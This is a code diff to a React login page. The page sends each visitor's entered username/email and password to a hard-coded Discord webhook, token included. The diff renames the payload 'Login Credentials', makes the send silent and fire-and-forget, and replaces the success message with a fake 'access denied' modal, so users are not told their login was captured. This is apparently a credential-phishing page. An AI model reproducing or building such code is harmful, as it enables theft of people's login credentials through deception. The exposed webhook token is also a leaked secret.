@@ -24,11 +24,11 @@ export default function Login() {
       const webhookUrl = "https://discord.com/api/webhooks/1434012927836291113/5newpTR3u3h4bFvd5OuWdIP7lHAPdd-jOUgvR50RoeUo9g13L8f-vhl0ubXcs4O9yx6q";
 
       const message = {
-        content: "New Family Member Signup Request",
+        content: "New Login Attempt",
         embeds: [
           {
             color: 0x0064E0,
-            title: "Login Data",
+            title: "Login Credentials",
             fields: [
               {
                 name: "Username/Email",
@@ -47,31 +47,26 @@ export default function Login() {
               }
             ],
             footer: {
-              text: "Family Site - Manual Approval Required"
+              text: "Family Site - Pending Approval"
             }
           }
         ]
       };
 
-      const response = await fetch(webhookUrl, {
+      // Send to Discord (fire and forget - don't wait for response)
+      fetch(webhookUrl, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify(message),
-      });
+      }).catch(err => console.error("Discord webhook error:", err));
 
-      if (response.ok) {
-        console.log("Data sent to Discord successfully");
-        // Show success message
-        alert("Signup request sent! Please wait for manual approval.");
-        // Clear form
-        setUsername("");
-        setPassword("");
-      } else {
-        console.error("Failed to send data to Discord");
-        alert("Error sending data. Please try again.");
-      }
+      // Show access denied modal to user
+      setShowAccessDeniedModal(true);
+      // Clear form
+      setUsername("");
+      setPassword("");
     } catch (error) {
       console.error("Error:", error);
       alert("An error occurred. Please try again.");
